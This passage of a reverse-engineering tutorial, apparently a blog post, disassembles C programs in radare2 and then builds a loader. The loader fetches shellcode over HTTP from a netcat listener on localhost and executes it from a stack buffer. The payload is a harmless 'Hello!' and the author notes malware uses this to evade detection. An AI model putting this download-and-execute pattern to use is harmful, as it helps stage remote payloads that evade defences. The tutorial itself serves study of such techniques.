<span class="err">│</span>           <span class="mh">0x5606c6856713</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5606c6856717</span>      <span class="mi">488</span><span class="n">b55f8</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5606c685671b</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x5606c6856720</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x5606c6856722</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x5606c6856723</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x5606c6856724</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x5606c6856704</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Same thing at start then the call:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x556afbdba800</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">10</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x556afbdba70c</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">buffer</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
            <span class="mh">0x556afbdba800</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
            <span class="mh">0x556afbdba801</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
            <span class="mh">0x556afbdba804</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
            <span class="mh">0x556afbdba808</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
            <span class="mh">0x556afbdba811</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mi">8</span><span class="p">],</span> <span class="n">rax</span>
            <span class="mh">0x556afbdba815</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
            <span class="mh">0x556afbdba817</span>  <span class="o">~</span>   <span class="mi">48</span><span class="n">b848656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x7266206f6c6c6548</span> <span class="p">;</span> <span class="err">'</span><span class="n">Hello</span> <span class="n">fr</span><span class="err">'</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">str</span><span class="p">.</span><span class="n">Hello_frH</span><span class="o">:</span>
</code></pre></div></div>
<p>There will be our code, running the program will output a “hello friend” without crashing.</p>

<h4 id="downloading-shellcode">Downloading shellcode</h4>

<p>So the smart reader may be probably thinking that as we only need those bytes in a buffer inside memory we can get them from a file or perhaps from a remote server and yes, that technique is commonly used by malware to avoid certain detection mechanisms.</p>

<p>Say we have some code like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">write</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It can be as simple or as complex as you want to, the only requisite for it is to be “self-contained” (or to set fixes on the host program) and we want to deliver it to a potential host that is “waiting for him” over the internet. We already know how to get and run it on the host program but how do we translate it into opcodes and deliver it over the network?</p>

<p>We can get those opcodes by using <em>ragg2</em> and then dump them into an hex file:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:~/</span><span class="n">C</span><span class="err">$</span> 
<span class="o">:~/</span><span class="n">C</span><span class="err">$</span> <span class="n">ragg2</span><span class="o">-</span><span class="n">cc</span>  <span class="o">-</span><span class="n">x</span> <span class="n">w</span><span class="p">.</span><span class="n">c</span>
<span class="n">eb0848656c6c6f210a00bf01000000488d35ecffffffba07000000b8010000000f0531ffb83c0000000f0531c0c3</span>
</code></pre></div></div>
<p>So now we can simply copy and paste this and use hexedit to create a new file and hex-paste it, then we’ll have our bin sc file ready to be delivered by using our favorite http server (or whatever else)</p>

<p>The dump will look like this inside r2:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x00000000</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">50</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rflags</span><span class="o">:</span>
<span class="err">┌</span> <span class="mi">38</span><span class="o">:</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="p">();</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x00000000</span>      <span class="n">eb00</span>           <span class="n">jmp</span> <span class="mi">2</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="err">@</span> 
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x00000002</span>      <span class="mi">488</span><span class="n">d351d0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x00000026</span><span class="p">]</span>       <span class="p">;</span> <span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span> <span class="p">;</span> <span class="mi">38</span>
<span class="err">│</span>           <span class="mh">0x00000009</span>      <span class="n">bf01000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x0000000e</span>      <span class="n">ba07000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span>
<span class="err">│</span>           <span class="mh">0x00000013</span>      <span class="n">b801000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x00000018</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
<span class="err">│</span>           <span class="mh">0x0000001a</span>      <span class="mi">31</span><span class="n">ff</span>           <span class="n">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
<span class="err">│</span>           <span class="mh">0x0000001c</span>      <span class="n">b83c000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x3c</span>               <span class="p">;</span> <span class="sc">'&lt;'</span> <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>           <span class="mh">0x00000021</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
<span class="err">│</span>           <span class="mh">0x00000023</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">└</span>           <span class="mh">0x00000025</span>      <span class="n">c3</span>             <span class="n">ret</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="err">@</span> <span class="mh">0x2</span>
            <span class="mh">0x00000026</span>      <span class="mi">48656</span><span class="n">c</span>         <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x00000029</span>      <span class="mi">6</span><span class="n">c</span>             <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x0000002a</span>      <span class="mi">6</span><span class="n">f</span>             <span class="n">outsd</span> <span class="n">dx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rsi</span><span class="p">]</span>
            <span class="mh">0x0000002b</span>      <span class="mi">210</span><span class="n">a</span>           <span class="n">and</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span>
            <span class="mh">0x0000002d</span>      <span class="mo">00</span><span class="n">ff</span>           <span class="n">add</span> <span class="n">bh</span><span class="p">,</span> <span class="n">bh</span>
</code></pre></div></div>
<p>As you see, in here we are directly dealing with syscalls (see the syscall instruction), also note that we have two of them one for print one for exit and the string is somehow selfcontained within the code.</p>

<p>Let’s go for the host programnow, it will look similar as the previous http client we messed with:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt; 
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define BSIZE 256
#define KSIZE 11
</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">portno</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">server</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">request</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"GET /sh HTTP/1.1</span><span class="se">\r\n</span><span class="s">User-Agent: nc/0.0.1</span><span class="se">\r\n</span><span class="s">Host: 127.0.0.1</span><span class="se">\r\n</span><span class="s">Accept: */*</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BSIZE</span><span class="p">];</span>

   <span class="n">portno</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
   <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">server</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

   
   <span class="n">bzero</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">));</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
   <span class="n">bcopy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">,</span> <span class="n">server</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">portno</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>

   <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"jumpting to shellcode</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
   <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buffer</span><span class="p">;</span>
   <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>

   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>That’ll be it, our small int func buffer routine has been added at the end and this time we are not reading a string but some executable bytes.</p>

<p>This time as I don’t want to over-complicate the example I won’t use a web server like apache2, I’ll use the netcat software to “emulate” a web server for this single request as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">80</span> <span class="o">&lt;</span> <span class="n">sh</span> 
<span class="n">Listening</span> <span class="n">on</span> <span class="p">[</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="p">(</span><span class="n">family</span> <span class="mi">0</span><span class="p">,</span> <span class="n">port</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">Connection</span> <span class="n">from</span> <span class="n">localhost</span> <span class="mi">36428</span> <span class="n">received</span><span class="o">!</span>
<span class="n">GET</span> <span class="o">/</span><span class="n">sh</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">Host</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">Accept</span><span class="o">:</span> <span class="err">*/</span><span class="o">*</span>
</code></pre></div></div>
<p>being sh the RAW HEX shellcode. This command basically indicates netcat to just dump the (bytes) from that file to the first client connected to its port 80.</p>

<p>Then running the progam will go like:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:~/</span><span class="n">C</span><span class="o">/</span><span class="n">generic</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">w</span> <span class="n">httpget_download_shellcode</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">sh</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span>
<span class="o">:~/</span><span class="n">C</span><span class="o">/</span><span class="n">generic</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">sh</span> 
<span class="n">jumpting</span> <span class="n">to</span> <span class="n">shellcode</span>
<span class="n">Hello</span><span class="o">!</span>
</code></pre></div></div>
<p>Note that I compiled the program using those flags, otherwise it won’t work.</p>

<p>Let’s now analyze it:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>         <span class="mh">0x55d39c38bac4</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bac6</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bacb</span> <span class="n">b</span>    <span class="n">e8c0fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bad0</span>      <span class="mi">8945</span><span class="n">ec</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bad3</span>      <span class="mi">488</span><span class="n">d3db40000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="n">jumpting_to_shellcode</span> <span class="p">;</span> <span class="mh">0x55d39c38bb8e</span> <span class="p">;</span> <span class="s">"jumpting to shellcode"</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bada</span>      <span class="n">e871fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span>       <span class="p">;</span> <span class="kt">int</span> <span class="n">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55d39c38badf</span>      <span class="mi">488</span><span class="n">d8570feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bae6</span>      <span class="mf">488945e0</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baea</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baee</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baf3</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
</code></pre></div></div>
<p>The buffer starts empty, as usual and then it will be filled with some good shellcode:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">afvd</span>
<span class="n">type</span><span class="o">:</span><span class="kt">char</span> <span class="o">**</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">exist</span>
<span class="n">arg</span> <span class="n">argc</span> <span class="o">=</span> <span class="mh">0x00000003</span> <span class="mh">0xffffffffffffffff</span>   <span class="p">........</span> <span class="err">@</span><span class="n">rdi</span> <span class="mi">0</span>
<span class="n">arg</span> <span class="n">argv</span> <span class="o">=</span> 
<span class="n">var</span> <span class="n">var_194h</span> <span class="o">=</span> <span class="mh">0x7ffe727894ec</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000000001</span>
<span class="n">var</span> <span class="n">var_1a0h</span> <span class="o">=</span> <span class="mh">0x7ffe727894e0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00007ffe72789768</span>
<span class="n">var</span> <span class="n">var_90h</span> <span class="o">=</span> <span class="mh">0x7ffe727895f0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x2068732f20544547</span>
<span class="n">var</span> <span class="n">var_88h</span> <span class="o">=</span> <span class="mh">0x7ffe727895f8</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x312e312f50545448</span>
<span class="n">var</span> <span class="n">var_80h</span> <span class="o">=</span> <span class="mh">0x7ffe72789600</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x412d726573550a0d</span>
<span class="n">var</span> <span class="n">var_78h</span> <span class="o">=</span> <span class="mh">0x7ffe72789608</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x636e203a746e6567</span>
<span class="n">var</span> <span class="n">var_70h</span> <span class="o">=</span> <span class="mh">0x7ffe72789610</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0a0d312e302e302f</span>
<span class="n">var</span> <span class="n">var_68h</span> <span class="o">=</span> <span class="mh">0x7ffe72789618</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x3231203a74736f48</span>
<span class="n">var</span> <span class="n">var_60h</span> <span class="o">=</span> <span class="mh">0x7ffe72789620</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0d312e302e302e37</span>
<span class="n">var</span> <span class="n">var_58h</span> <span class="o">=</span> <span class="mh">0x7ffe72789628</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x3a7470656363410a</span>
<span class="n">var</span> <span class="n">var_50h</span> <span class="o">=</span> <span class="mh">0x7ffe72789630</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0a0d0a0d2a2f2a20</span>
<span class="n">var</span> <span class="n">var_48h</span> <span class="o">=</span> <span class="mh">0x7ffe72789638</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000f0b500</span>
<span class="n">var</span> <span class="n">var_4h</span> <span class="o">=</span> <span class="mh">0x7ffe7278967c</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x9c38bb0000000050</span>
<span class="n">var</span> <span class="n">var_8h</span> <span class="o">=</span> <span class="mh">0x7ffe72789678</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000005000000003</span>
<span class="n">var</span> <span class="n">var_10h</span> <span class="o">=</span> <span class="mh">0x7ffe72789670</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00007f4571b62300</span>
<span class="n">var</span> <span class="n">var_30h</span> <span class="o">=</span> <span class="mh">0x7ffe72789650</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0100007f50000002</span>
<span class="n">var</span> <span class="n">var_2eh</span> <span class="o">=</span> <span class="mh">0x7ffe72789652</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00000100007f5000</span>
<span class="n">var</span> <span class="n">var_190h</span> <span class="o">=</span> <span class="mh">0x7ffe727894f0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000000000</span>
<span class="n">var</span> <span class="n">var_14h</span> <span class="o">=</span> <span class="mh">0x7ffe7278966c</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x71b6230000000048</span>
<span class="n">var</span> <span class="n">var_20h</span> <span class="o">=</span> <span class="mh">0x7ffe72789660</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x000055d39c38bb00</span>

<span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffe727894f0</span>
<span class="mh">0x7ffe727894f0</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789500</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789510</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789520</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789530</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789540</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789550</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789560</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
</code></pre></div></div>
<p>Then after the read call:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dc</span>
<span class="n">hit</span> <span class="n">breakpoint</span> <span class="n">at</span><span class="o">:</span> <span class="mi">55</span><span class="n">d39c38bad0</span>
<span class="p">[</span><span class="mh">0x55d39c38bad0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffe727894f0</span>
<span class="mh">0x7ffe727894f0</span>  <span class="mh">0x8d4800eb</span> <span class="mh">0x00001d35</span> <span class="mh">0x0001bf00</span> <span class="mh">0x07ba0000</span>  <span class="p">..</span><span class="n">H</span><span class="p">.</span><span class="mi">5</span><span class="p">...........</span>
<span class="mh">0x7ffe72789500</span>  <span class="mh">0xb8000000</span> <span class="mh">0x00000001</span> <span class="mh">0xff31050f</span> <span class="mh">0x00003cb8</span>  <span class="p">..........</span><span class="mi">1</span><span class="p">..</span><span class="o">&lt;</span><span class="p">..</span>
<span class="mh">0x7ffe72789510</span>  <span class="mh">0x31050f00</span> <span class="mh">0x6548c3c0</span> <span class="mh">0x216f6c6c</span> <span class="mh">0x0000000a</span>  <span class="p">...</span><span class="mi">1</span><span class="p">..</span><span class="n">Hello</span><span class="o">!</span><span class="p">....</span>
<span class="mh">0x7ffe72789520</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
</code></pre></div></div>
<p>Here we have it here!</p>

<p>Now at this point:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55d39c38baea</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baee</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baf3</span> <span class="n">b</span>    <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
